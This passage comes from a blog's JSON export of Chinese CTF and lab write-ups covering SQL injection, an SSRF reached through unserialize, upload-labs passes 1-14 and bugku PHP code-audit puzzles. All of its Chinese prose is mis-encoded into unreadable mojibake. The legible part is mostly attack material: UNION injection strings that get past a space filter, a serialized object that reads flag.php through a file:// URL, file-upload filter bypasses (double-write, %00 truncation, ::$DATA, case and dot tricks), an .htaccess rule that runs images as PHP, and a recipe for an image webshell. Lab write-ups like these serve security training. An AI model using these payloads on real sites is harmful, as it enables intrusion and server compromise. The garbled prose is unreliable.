è¯•äº†è¯•åŒå†™ç»•è¿‡ï¼Œå‘ç°ç»§ç»­æç¤ºhackï¼Œå†è¯•è¯•ç”¨/**/æ›¿æ¢ç©ºæ ¼ï¼Œè¿™æ¬¡å±…ç„¶å¯ä»¥äº†ï¼Œæš‚ä¸”å½“å®ƒæ˜¯ç¦äº†ç©ºæ ¼ã€‚è¿™é‡Œè¿˜å‡ºç°ä¸€ä¸ªæç¤º Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 æç¤ºå­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ç»§ç»­çˆ†è¡¨ã€‚ ?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4# ?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;# çˆ†å‡ºä¸€å¤§å †åˆ—åã€‚ç›´æ¥è¯»å–dataçš„å†…å®¹ no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-2 union/**/select 1,(select data from users),3,4 # å‘ç°å†…å®¹æ˜¯æ³¨å†Œæ—¶ä¿¡æ¯ä¿å­˜ä¸ºåºåˆ—åŒ–å†…å®¹ O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€sunzyâ€;s:3:â€ageâ€;i:22;s:4:â€blogâ€;s:12:â€22.github.ioâ€;} åˆ°è¿™é‡Œå°±ä¸çŸ¥é“æ€ä¹ˆåŠäº†ã€‚ã€‚ã€‚ 0x02å®¡è®¡æºç æ‰«æä¸€ä¸‹ç›®å½•å‘ç°äº†robots.txtï¼Œå…¶ä¸­ç»™å‡ºæ¥äº†æºç å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„ æºç  12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass UserInfo //userä¿¡æ¯ç±»&#123; public $name = \"\"; public $age = 0; public $blog = \"\";public function __construct($name, $age, $blog)&#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog;&#125;function get($url) // å¤„ç†url&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output;&#125;public function getBlogContents ()&#123; return $this-&gt;get($this-&gt;blog);&#125;public function isValidBlog ()&#123; $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);&#125;&#125; å®¡è®¡æºç å‘ç°å…¶ä¸­get()å‡½æ•°å­˜åœ¨SSRF(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )æ¼æ´ã€‚ æ€è·¯ï¼šåˆ©ç”¨noå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æ„é€ fileæ–‡ä»¶åè®®ï¼Œåˆ©ç”¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„flag.phpæ–‡ä»¶ã€‚ 1?no=-2%20union/**/select%201,2,3,'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"sunzy\";s:3:\"age\";i:22;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'%20# æŸ¥çœ‹æºç ï¼Œè§£base64ã€‚","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"unserailize","slug":"unserailize","permalink":"https://sunzhengyu99.github.io/tags/unserailize/"}]},{"title":"upload-11-21","date":"2020-09-18T13:58:51.000Z","path":"2020/09/18/upload2/","text":"upload-labs 11-21 pass1112345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); è¿™æ®µä»£ç æ˜¯å°†æ–‡ä»¶åä¸­å‡ºç° deny_extçš„åç¼€åæ›¿æ¢ä¸ºç©º å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå³1.pphphp pass12123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else&#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; &#125;&#125; æœ¬é¢˜ä¸ä¹‹å‰çš„é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é¢˜çš„æ–‡ä»¶çš„ä¿å­˜è·¯å¾„æ˜¯å¯ä»¥æ§åˆ¶çš„ è¿™é‡Œç”¨çš„%00æˆªæ–­ï¼ŒåŸç†å¦‚ä¸‹ www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.phpå…¶åç¼€åä¸º.jpgå¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä½†æ˜¯windowsç³»ç»Ÿå¤„ç†æ—¶ä¸ä¼šå¤„ç†%00ä¹‹åçš„å†…å®¹æ•…ä¿å­˜çš„æ–‡ä»¶å°±æ˜¯qq.php pass13è¿™é¢˜ä¸ä¸Šé¢˜åˆ©ç”¨çš„åŸç†ç›¸åŒ ä½†æ˜¯è¿™é‡Œè¦ä½¿ç”¨ 00çš„äºŒè¿›åˆ¶å½¢å¼ pass14 æ˜ç¡®è¯´äº†ä¸Šä¼ å›¾ç‰‡æœ¨é©¬ 12345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125; GIF89a æ˜¯GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´ ï¼Œæ˜¯ä¸ºäº†ç»•è¿‡gifæ–‡ä»¶çš„æ£€æŸ¥ å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ æ¡Œé¢å»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å°†å…¶æ”¹ä¸º2.jpgï¼Œå†å»ºç«‹ä¸€ä¸ªæ”¹ä¸º1.php,å…¶å†…å®¹ä¸ºä½ æƒ³æ·»åŠ çš„ä¸€å¥è¯æœ¨é©¬ copy 2.jpg /b + 1.php /a webshell.jpg æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚","tags":[{"name":"åŒå†™ç»•è¿‡","slug":"åŒå†™ç»•è¿‡","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":"00æˆªæ–­","slug":"00æˆªæ–­","permalink":"https://sunzhengyu99.github.io/tags/00%E6%88%AA%E6%96%AD/"}]},{"title":"uploads-labs","date":"2020-09-16T13:48:48.000Z","path":"2020/09/16/uploads/","text":"upload-labs 1-10 pass1ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºjpg,png,gifå³å¯ pass2æŸ¥çœ‹æºç  1if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) è¿™æ®µä»£ç è¯´æ˜æ˜¯å¯¹æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼  1.php æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸º &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,è¿™ä¸‰ä¸ªç±»å‹éƒ½ä¸ºå›¾ç‰‡ çŸ¥è¯†ç‚¹è¡¥å……ï¼š MIMEç±»å‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯ä¼ ç»Ÿå†™æ³•éƒ½æ˜¯å°å†™ã€‚ 12345678910111213text/plaintext/htmlimage/jpegimage/pngaudio/mpegaudio/oggaudio/*video/mp4application/*application/jsonapplication/javascriptapplication/ecmascriptapplication/octet-stream æ›´è¯¦ç»†çš„è§£é‡Šï¼Œ pass31$deny_ext = array('.asp','.aspx','.php','.jsp'); åªç¦æ­¢äº†.asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨php3,php5,php7,phtmlç­‰ç­‰åç¼€åç»•è¿‡ pass4.htaccessæ–‡ä»¶çš„ä½œç”¨ URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ MIMEç±»å‹é…ç½® è®¿é—®æƒé™æ§åˆ¶ç­‰ ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ å›¾ç‰‡é˜²ç›—é“¾ è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µ ç›®å½•æµè§ˆä¸ä¸»é¡µ ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ æ–‡ä»¶å¯†ç ä¿æŠ¤ 123&lt;FilesMatch \"1.jpg\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; è¿™å‡ å¥ä»£ç çš„æ„æ€ï¼š é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€1.jpgâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œ æ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ ä¸Šä¼ å®Œ.htaccessæ–‡ä»¶åç›´æ¥ä¸Šä¼ ä¸€ä¸ª 1.jpgå³å¯ pass5123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; æœ¬é¢˜ä¸ç¬¬åé¢˜å®Œå…¨ä¸€æ ·ï¼Œè¯¦ç»†è§£ç­”è§ç¬¬åé¢˜ pass61234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; ä»”ç»†æŸ¥çœ‹æºç ä¼šå‘ç°å°‘äº†ä¸‹é¢çš„è¿™æ®µä»£ç  1$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ è¿™é‡Œå°±å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚å°†æ–‡ä»¶åç¼€åæ”¹ä¸º.pHp , .PHPç­‰ pass71234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; è·Ÿç¬¬å…­å…³å¯¹æ¯”å‘ç°å°‘äº†è¿™å¥è¯ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼å’Œç‚¹ï¼Œå†™æˆ1.php .ï¼Œè¿™ä¸ªéœ€è¦ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹ï¼Œä¸Šä¼ åä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª.ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯1.php pass81234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; è¿™æ®µä»£ç å°‘äº†è¿™å¥è¯ï¼Œå¯ä»¥ä¸ç¬¬å…­å…³ç›¸åŒçš„åšæ³• $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ pass91234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; ä»”ç»†è§‚å¯Ÿå‘ç°å°‘äº†è¿™æ®µä»£ç  1$file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA é‡‡ç”¨Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ å°†æ–‡ä»¶åæ”¹ä¸º 1.php::$DATA,ä½†æ˜¯å®è´¨ä¸Šä¿å­˜çš„æ–‡ä»¶è¿˜æ˜¯1.php pass10123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; è¿™ä¸€å¥ä»£ç æ˜¯ç”¨æ¥æ£€æµ‹æœ«å°¾æ˜¯å¦æ˜¯.ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚æŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º1.php. . ï¼ˆæ³¨æ„ä¸¤ç‚¹ä¹‹é—´æœ‰ç©ºæ ¼ï¼‰ å‰é¢å»æ‰.ç„¶åæ£€éªŒ.ä¸å­˜åœ¨ï¼Œå†å»ç©ºæ ¼ï¼Œç•™ä¸‹php.ï¼Œç„¶åphp.ä¸å±äº$deny_extæ•°ç»„ä¸­å­˜åœ¨çš„ï¼Œå½“ç„¶å°±ç›´æ¥æäº¤äº†ã€‚å› ä¸ºwindowsè‡ªåŠ¨å»ç‚¹ï¼Œäºæ˜¯phpåç¼€å°±å‡ºæ¥äº†","tags":[{"name":"MIME","slug":"MIME","permalink":"https://sunzhengyu99.github.io/tags/MIME/"},{"name":"å¤§å°å†™ç»•è¿‡","slug":"å¤§å°å†™ç»•è¿‡","permalink":"https://sunzhengyu99.github.io/tags/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":".htaccess","slug":"htaccess","permalink":"https://sunzhengyu99.github.io/tags/htaccess/"},{"name":"windowsæ–‡ä»¶ç‰¹æ€§","slug":"windowsæ–‡ä»¶ç‰¹æ€§","permalink":"https://sunzhengyu99.github.io/tags/windows%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7/"}]},{"title":"bugkuä»£ç å®¡è®¡","date":"2020-09-14T13:01:01.000Z","path":"2020/09/14/decode/","text":"ç®€å•çš„ä»£ç å®¡è®¡ extractå˜é‡è¦†ç›–12345678910111213141516&lt;?php$flag='xxx'; //æ–°å»ºå˜é‡extract($_GET); // å˜é‡è¦†ç›–if(isset($shiyan)) //åˆ¤æ–­æ˜¯å¦å­˜åœ¨&#123;$content=trim(file_get_contents($flag));//æŠŠæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸²if($shiyan==$content) //åˆ¤æ–­ä¸¤å˜é‡æ˜¯å¦ç›¸ç­‰&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; extract()å‡½æ•° isset()å‡½æ•°isset() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULLã€‚ å¦‚æœå·²ç»ä½¿ç”¨ unset() é‡Šæ”¾äº†ä¸€ä¸ªå˜é‡ä¹‹åï¼Œå†é€šè¿‡ isset() åˆ¤æ–­å°†è¿”å› FALSEã€‚ è‹¥ä½¿ç”¨ isset() æµ‹è¯•ä¸€ä¸ªè¢«è®¾ç½®æˆ NULL çš„å˜é‡ï¼Œå°†è¿”å› FALSEã€‚ åŒæ—¶è¦æ³¨æ„çš„æ˜¯ null å­—ç¬¦ï¼ˆâ€\\0â€ï¼‰å¹¶ä¸ç­‰åŒäº PHP çš„ NULL å¸¸é‡ã€‚ Tips:isset()å‡½æ•°å¦‚æœä¸€æ¬¡ä¼ å…¥å¤šä¸ªå‚æ•°ï¼Œåªæœ‰å‚æ•°å…¨è¢«è®¾ç½®ä¸”éç©ºçš„æƒ…å†µä¸‹æ‰è¿”å›TRUEï¼Œisset()å‡½æ•°å¯¹æ•°ç»„ä¸­çš„å…ƒç´ åŒæ ·é€‚ç”¨ã€‚ file_get_contents() å˜é‡è¦†ç›–çš„æ„æ€å°±æ˜¯è®©è‡ªå·±ä¸Šä¼ çš„å˜é‡å€¼è¦†ç›–åŸæœ‰çš„å˜é‡å€¼ è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ $shiyan==$content,è€Œcontentçš„å€¼æ¥è‡ªäºå‡½æ•°è‡ªå·±å»ºçš„$flagå˜é‡ï¼Œæ‰€ä»¥è¿™é¢˜ç›®çš„å˜é‡è¦†ç›–å®é™…æ˜¯è¦†ç›–$flagçš„å€¼ï¼Œè®©flagçš„å€¼å’Œshiyançš„å€¼ç›¸åŒ å¯ä»¥ç”¨ç©ºå€¼çš„æ–¹æ³•ä½¿äºŒè€…æƒ³ç­‰å³ ?shiyan=&amp;flag= strcmpæ¯”è¾ƒå­—ç¬¦ä¸²http://123.206.87.240:9009/6.php 12345678910&lt;?php$flag = \"flag&#123;xxxxx&#125;\";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) //å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 